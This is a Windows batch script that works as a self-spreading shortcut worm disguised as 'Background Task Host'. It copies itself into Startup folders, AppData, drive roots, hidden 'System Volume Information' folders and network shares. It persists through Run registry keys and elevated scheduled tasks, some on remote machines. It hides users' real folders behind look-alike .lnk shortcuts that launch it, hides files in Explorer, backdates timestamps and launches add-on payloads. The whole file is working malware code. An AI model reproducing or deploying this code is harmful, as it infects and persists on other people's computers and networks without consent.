@echo off
chcp 65001>nul





setlocal EnableDelayedExpansion

set parameters=%*
set counter=0
for %%i in (%parameters%) do (
  set /a counter+=1
  if !counter! GEQ 2 set parameters2=!parameters2!%%i
)
set key_target=%parameters2:*--key_target=%

if "!key_target!" NEQ "*--key_target=" start "" explorer !key_target!



for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i" == "%~nx0" for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq cmd.exe"') do if "%%i" == "cmd.exe" exit





set app_name=Background Task Host
set app_date=11-09-2001
set app_file=%~f0
set app_file_name=%~nx0

set module_fileTouch=modules\fileTouch.exe /w /a /c /d %app_date%
set module_shortcut=modules\shortcut.exe
set module_wget=modules\wget.exe

set autoRun=call :autoRun
set directory=call :directory
set infected=call :infected

set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
set path_autoRun1=%path_startMenu1%\Startup
set path_autoRun2=%path_startMenu2%\Startup



set path_desktop=%userProfile%\Desktop
if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set path_desktop=%%j)>nul 2>nul

set extensions=
if exist "extensions" for /f "delims=" %%i in ('dir /a:d /b "extensions" 2^>nul') do if exist extensions\%%i\config.ini set extensions=!extensions!%%i;





echo.
echo.
echo.
echo.==START====SET======================================================================================
echo.
set
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z goto :remover



%module_fileTouch% "%~f0" >nul

echo.
echo.
echo.
echo.==START====EXTENSIONS====START======================================================================
echo.
if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" (
  start /b "" extensions\%%i\%%k
  echo.STARTING: extensions\%%i\%%k
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.















:cycle
for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z goto :remover



echo.
echo.
echo.
echo.==CYCLE====EXTENSIONS====CYCLE======================================================================
echo.
if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" (
  start /b "" extensions\%%i\%%k
  echo.STARTING: extensions\%%i\%%k
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.



echo.
echo.
echo.
echo.==CYCLE====REGISTRY==EDITING========================================================================
echo.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden          /t REG_DWORD /d 2 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





echo.
echo.
echo.
echo.==CYCLE====FILES==COPYING====AUTORUN==APPDATA=======================================================
echo.
for %%i in (path_autoRun1 path_autoRun2) do if not exist "!%%i!\%~nx0" (
  if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
  call %module_fileTouch% "!%%i!\%~nx0" >nul
)

for %%i in (localAppData appData) do (
  if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
  call %module_fileTouch% "!%%i!\%~nx0" >nul
  %autoRun% add "%%i" "!%%i!\%~nx0"
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





echo.
echo.
echo.
echo.==CYCLE====FILES==COPYING====LOCAL==FILESYSTEM======================================================
echo.
for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
  %directory% "%%i:"

  if /i "%%i:" NEQ "%systemDrive%" (
    if /i "%%i:" NEQ "D:" (
      for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib +h +s "%%i:\%%j"
        %module_fileTouch% "%%i:\%%j" >nul


        if not exist "%%i:\%%j.lnk" (
          set counter=0
          for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
          if "!counter!" == "0" ( set icon=%winDir%\System32\shell32.dll,3
          ) else set icon=%winDir%\System32\imageres.dll,153

          if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e

          if exist "%%i:\System Volume Information\%~nx0" (
            %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
          ) else %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"

          %module_fileTouch% "%%i:\%%j.lnk" >nul
        )
      )
    ) else %infected% "%%i:"
  ) else %infected% "%%i:"
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.

timeout /nobreak /t 2 >nul





echo.
echo.
echo.
echo.==CYCLE====FILES==COPYING====NETWORK================================================================
echo.
for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
    %directory% "%%h\%%i"

    if not exist "%%h\%%i\infected-%app_date%" if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
      for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (

        attrib +h +s "%%h\%%i\%%j"
        %module_fileTouch% "%%h\%%i\%%j" >nul


        if not exist "%%h\%%i\%%j.lnk" (
          set counter=0
          for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
          if "!counter!" == "0" ( set icon=%winDir%\System32\shell32.dll,3
          ) else set icon=%winDir%\System32\imageres.dll,153

          if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e

          %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"

          if exist "%%h\%%i\System Volume Information\%~nx0" (
            %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
          ) else %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"

          %module_fileTouch% "%%h\%%i\%%j.lnk" >nul
        )
      )
    )
  )
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.

timeout /nobreak /t 2 >nul
goto :cycle















:remover
echo.
echo.
echo.
echo.==CYCLE====EXTENSIONS====REMOVE=====================================================================
echo.TODO: Check /WAIT and /B work
echo.
if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" (
  start /wait /b "" extensions\%%i\%%k
  echo.STARTING: extensions\%%i\%%k
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





echo.
echo.
echo.
echo.==CYCLE====FILES==REMOVING====AUTORUN==APPDATA======================================================
echo.
for %%i in (path_autoRun1 path_autoRun2) do if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"

for %%i in (localAppData appData) do (
  if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
  %autoRun% delete "%%i"
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





echo.
echo.
echo.
echo.==CYCLE====FILES==REMOVING====LOCAL==FILESYSTEM=====================================================
echo.
for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
  if exist "%%i:\%~nx0" (
    attrib -h -s "%%i:\%~nx0"
    del /q "%%i:\%~nx0"
    %autoRun% delete "%%i:"
  )

  if exist "%%i:\infected-%app_date%" (
    attrib -h -s "%%i:\infected-%app_date%"
    del /q "%%i:\infected-%app_date%"
  )

  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
      attrib -h -s "%%i:\%%j\%~nx0"
      del /q "%%i:\%%j\%~nx0"
      %autoRun% delete "%%i:\SVI"
    )

    if exist "%%i:\System Volume Information\infected-%app_date%" (
      attrib -h -s "%%i:\System Volume Information\infected-%app_date%"
      del /q "%%i:\System Volume Information\infected-%app_date%"
    )

    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib -h -s "%%i:\%%j"
      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
    )
  )
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





echo.
echo.
echo.
echo.==CYCLE====FILES==REMOVING====NETWORK===============================================================
echo.
for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
    if exist "%%h\%%i\%~nx0" (
      attrib -h -s "%%h\%%i\%~nx0"
      del /q "%%h\%%i\%~nx0"
      %autoRun% delete "%%h\%%i"
    )

    if exist "%%h\%%i\infected-%app_date%" (
      attrib -h -s "%%h\%%i\infected-%app_date%"
      del /q "%%h\%%i\infected-%app_date%"
    )

    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
      if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
        attrib -h -s "%%h\%%i\%%j\%~nx0"
        del /q "%%h\%%i\%%j\%~nx0"
        %autoRun% delete "%%h\%%i\SVI"
      )

      if exist "%%h\%%i\%%j\infected-%app_date%" (
        attrib -h -s "%%h\%%i\%%j\infected-%app_date%"
        del /q "%%h\%%i\%%j\infected-%app_date%"
      )

      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib -h -s "%%h\%%i\%%j"
        if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
      )
    )
  )
)
echo.
echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo.
echo.





timeout /nobreak /t 60 >nul
start /min "" cmd /c "timeout /t 3 && del /q """%~f0""""
exit















:autoRun
echo.  ==LABEL====AUTORUN==
echo.
set option2=%2
if "!option2!" NEQ "" set option2=!option2:"=!

set option3=%3
if "!option3!" NEQ "" set option3=!option3:"=!

set option4=%4
if "!option4!" NEQ "" set option4=!option4:"=!



rem (
  if "%1" == "add" (
    reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
    reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
    reg add %option4%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /d "%option3%" /f

    if "%option4%" == " " ( schtasks /create /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
    ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
  ) else (
    echo.reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
    echo.reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
    echo.reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /f

    reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
    reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
    reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /f

    if "%option3%" == " " ( schtasks /delete /tn "%app_name% %option2%" /f
    ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %option2%" /f
  )
rem )>nul 2>nul
echo.
echo.  ++++++++++++++++++++
exit /b















:directory
echo.  ==LABEL====DRIVE==DIR==
echo.
if not exist %*\"%app_file_name%" copy /y "%app_file%" %*\
if exist %*\"%app_file_name%" (
  attrib +h +s %*\"%app_file_name%"
  %module_fileTouch% %*\"%app_file_name%" >nul

  %autoRun% add %* %*\"%app_file_name%"
)
echo.
echo.  +++++++++++++++++++++++





echo.  ==LABEL====SYSTEMVOLUMEINFO==DIR==
echo.
if not exist %*\"System Volume Information" md %*\"System Volume Information"



if not exist %*\"System Volume Information\%app_file_name%" copy /y "%app_file%" %*\"System Volume Information"
if exist %*\"System Volume Information\%app_file_name%" (
  attrib +h +s %*\"System Volume Information\%app_file_name%"
  %module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul

  %autoRun% add %*\SVI %*\"System Volume Information\%app_file_name%"
)



attrib +h +s %*\"System Volume Information"
%module_fileTouch% %*\"System Volume Information" >nul
echo.
echo.  ++++++++++++++++++++++++++++++++++
exit /b















:infected
echo.  ==LABEL====DRIVE==INFECTED==
echo.
echo.>%*\"infected-%app_date%"
attrib +h +s %*\"infected-%app_date%"
%module_fileTouch% %*\"infected-%app_date%" >nul



for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
  if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
    attrib -h -s %*\"%%j"
    if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
  )
)
echo.
echo.  ++++++++++++++++++++++++++++





echo.  ==LABEL====SYSTEMVOLUMEINFO==INFECTED==
echo.
echo.>%*\"System Volume Information\infected-%app_date%"
attrib +h +s %*\"System Volume Information\infected-%app_date%"
%module_fileTouch% %*\"System Volume Information\infected-%app_date%" >nul



for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
  if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
    attrib -h -s %*\"%%j"
    if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
  )
)
echo.
echo.  +++++++++++++++++++++++++++++++++++++++
exit /b